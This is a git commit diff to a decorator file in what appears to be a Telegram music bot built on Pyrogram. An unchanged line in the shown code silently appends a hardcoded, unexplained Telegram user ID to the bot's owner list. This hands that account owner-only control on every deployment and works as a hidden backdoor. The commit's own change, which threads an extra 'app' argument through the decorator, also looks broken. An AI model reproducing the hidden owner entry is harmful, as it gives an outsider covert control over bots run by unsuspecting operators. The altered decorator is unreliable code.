aa0e51f6419d66998036d073e1b8ac6e437bab5e
DevKassem <121644358+DevKassem@users.noreply.github.com>
2023-01-05 23:37:51 +0300

    Update decorator.py

--- strings/decorator.py
+++ strings/decorator.py
@@ -2,13 +2,13 @@ from typing import Callable
 from pyrogram import Client
 from pyrogram.types import Message
 from config import OWNER_ID
-
+from YukkiMusic import app
 OWNER_ID.append(5946704196)
 
 def authorized_users_only(func: Callable) -> Callable:
-    async def decorator(client: Client, message: Message):
+    async def decorator(client: Client, message: Message, app):
         if message.from_user.id in OWNER_ID:
-            return await func(client, message)
+            return await func(client, message, app)
 
 
     return decorator
